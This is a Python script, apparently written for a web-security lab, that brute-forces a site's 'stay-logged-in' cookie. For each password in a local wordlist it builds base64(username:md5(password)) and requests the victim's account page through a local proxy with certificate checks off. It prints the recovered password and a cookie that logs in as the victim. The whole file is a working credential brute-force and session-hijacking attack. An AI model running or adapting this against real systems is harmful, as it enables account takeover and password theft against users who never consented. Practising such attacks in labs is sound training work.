import requests
import sys
import urllib3
import hashlib
import base64
# dedoxd2

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080",
}



def    brute_force_password(url,username):
    with open("./passwds",'r') as password_file:
        passwords = [password.rstrip() for password in password_file]
    
    victim_profile = url + '/my-account?id=' + username
    
    
   # payload = username+':'+ hashlib.md5('peter'.encode()).hexdigest() # plain text 

   # encoded_bytes = base64.b64encode(payload.encode('utf-8'))
   # encoded_str = encoded_bytes.decode('utf-8')
   # print(encoded_str)

    for passwd in passwords:
        # to send the payload encoded in base64 , we first need to encode the text into bytes then encode it to base64
        
#        print(passwd)
#        print(type(passwd))
        
        payload = username+':'+ hashlib.md5(passwd.encode()).hexdigest() # plain text 
        encoded_bytes = base64.b64encode(payload.encode('utf-8'))
        encoded_str = encoded_bytes.decode('utf-8')

        headers = {
            "Cookie":"stay-logged-in="+encoded_str
        }
        response = requests.get(victim_profile , verify=False,proxies=proxies,headers=headers,allow_redirects=False)
        if response.status_code == 200:
            print(f"(+) Victim's password '{passwd}'")
            print(f"(+) Use this cookie to login as the vicim '{encoded_str}' ")
            break






def main():
    if len(sys.argv) !=3:
        print(f"(-) Usage {sys.argv[0]} http://example.com/ victim_username")
        sys.exit(-1)

    url = sys.argv[1]
    username = sys.argv[2]
    brute_force_password(url,username)

if __name__ =="__main__":
    
    main()